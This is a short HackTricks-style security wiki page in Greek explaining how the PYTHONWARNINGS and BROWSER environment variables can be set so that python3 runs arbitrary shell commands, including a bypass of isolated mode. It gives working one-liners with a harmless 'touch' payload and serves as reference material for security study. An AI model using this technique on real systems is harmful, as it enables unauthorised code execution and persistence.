# Injection σε Python Applications του macOS

{{#include ../../../banners/hacktricks-training.md}}

## Μέσω των env variables `PYTHONWARNINGS` και `BROWSER`

Είναι δυνατό να τροποποιηθούν και οι δύο environment variables ώστε να εκτελείται arbitrary code κάθε φορά που καλείται η Python, για παράδειγμα:<sup>[[1]](#references)</sup>
```bash
# Generate example python script
echo "print('hi')" > /tmp/script.py

# RCE which will generate file /tmp/hacktricks
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## Αναφορές

- [1] [Hacking με Environment Variables - elttam](https://www.elttam.com/blog/env/)

{{#include ../../../banners/hacktricks-training.md}}
